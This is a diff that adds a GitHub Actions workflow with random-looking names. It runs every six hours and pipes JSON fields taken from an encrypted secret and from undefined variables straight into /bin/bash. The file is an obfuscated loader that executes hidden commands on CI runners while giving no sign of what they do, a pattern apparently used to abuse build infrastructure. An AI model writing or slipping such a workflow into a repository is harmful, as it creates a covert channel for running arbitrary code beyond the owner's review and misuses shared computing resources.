@@ -1,0 +1,22 @@
+name: darknessproposed
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: darknessproposed
+        env:
+          pqwy93877: ${{ secrets.pqwy93877 }}
+        run: |
+          echo $pqwy93877 | jq -r .li503 | /bin/bash
+          echo $j6542 | jq -r .rnfvy5 | /bin/bash
+          echo $xgati8569 | jq -r .rm10115 | /bin/bash
+          echo $ugs49357 | jq -r .coev877 | /bin/bash
+          echo $htszs8 | jq -r .so7754 | /bin/bash
+
